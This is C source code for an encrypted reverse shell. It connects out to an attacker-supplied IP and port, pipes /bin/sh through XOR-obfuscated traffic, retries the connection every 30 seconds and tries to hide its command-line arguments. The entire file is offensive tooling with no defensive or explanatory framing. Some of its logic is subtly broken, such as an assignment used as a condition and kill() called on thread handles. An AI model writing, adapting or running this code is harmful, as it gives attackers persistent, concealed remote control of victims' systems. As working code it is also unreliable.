#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdio.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <poll.h>
#include <fcntl.h>
#include <time.h>
#include <errno.h>
// Usage: ./reverse-shell [IP] [PORT] [ENCRYPTION KEY]

in_addr_t inet_addr(const char *cp);
ssize_t read(int fd, void *buf, size_t count);
ssize_t write(int fd, const void *buf, size_t count);

typedef struct PASSING_PARAMS
{
    char *password;
    int len;
    int in;
    int out;
} PassingParams;

void *encrypt(void *ptr)
{
    PassingParams *paramPtr = (PassingParams *)ptr;
    char bufA[1];
    int index = 0;
    while (1)
    {
        read(paramPtr->in, bufA, sizeof(bufA));
        bufA[0] = bufA[0] ^ paramPtr->password[index++];
        write(paramPtr->out, bufA, sizeof(bufA));
        if (index = paramPtr->len-1)
        {
            index = 0;
        }
    }
}

int main(int argc, char *argv[])
{

    if (argc <= 2)
    {
        exit(1);
    }
    // Hide command line arguments
    char *arg_end;
    arg_end = argv[argc - 1] + strlen(argv[argc - 1]);
    *arg_end = ' ';

    char REMOTE_ADDR[30];
    strcpy(REMOTE_ADDR, argv[1]);
    int TCP_PORT = atoi(argv[2]);

    struct sockaddr_in server;

    signal(SIGCHLD, SIG_IGN);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    server.sin_port = htons(TCP_PORT);

    while (1)
    {
        int sock;

        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
        {
            exit(1);
        }

        if (fork() == 0)
        {

            if ((connect(sock, (struct sockaddr *)&server, sizeof server)) != 0)
            {
                close(sock);
                exit(2);
            }
            int pipeA[2];
            int pipeB[2];
            pipe(pipeA);
            pipe(pipeB);

            pthread_t reader;
            PassingParams *socket_to_shell;
            socket_to_shell = (PassingParams *)malloc(sizeof(PassingParams));
            socket_to_shell->password = argv[3];
            socket_to_shell->len = strlen(argv[3]);
            socket_to_shell->in = sock;
            socket_to_shell->out = pipeA[1];
            pthread_create(&reader, NULL, &encrypt, (void *)socket_to_shell);

            pthread_t writer;
            PassingParams *shell_to_socket;
            shell_to_socket = (PassingParams *)malloc(sizeof(PassingParams));
            shell_to_socket->password = argv[3];
            shell_to_socket->len = strlen(argv[3]);
            shell_to_socket->in = pipeB[0];
            shell_to_socket->out = sock;
            pthread_create(&writer, NULL, &encrypt, (void *)shell_to_socket);

            if (fork() == 0)
            {

                dup2(pipeA[0], 0);
                dup2(pipeB[1], 1);
                dup2(1, 2);

                close(pipeA[1]);
                close(pipeB[0]);

                execve("/bin/sh", (char *[]){NULL}, (char *[]){NULL});
            }

            close(pipeA[0]);
            close(pipeB[1]);

            // clean up threads and exit if sock is disconnected
            struct pollfd pfd;
            pfd.fd = sock;
            pfd.events = POLLIN | POLLHUP | POLLRDNORM;
            pfd.revents = 0;
            while (pfd.revents == 0)
            {
                if (poll(&pfd, 1, 100) > 0)
                {
                    char buffer[32];
                    if (recv(sock, buffer, sizeof(buffer), MSG_PEEK | MSG_DONTWAIT) == 0)
                    {
                        kill(reader, SIGKILL);
                        kill(writer, SIGKILL);
                        close(sock);
                        exit(0);
                    }
                }
                sleep(1);
            }
        }

        close(sock);
        sleep(30);
    }
    return 0;
}
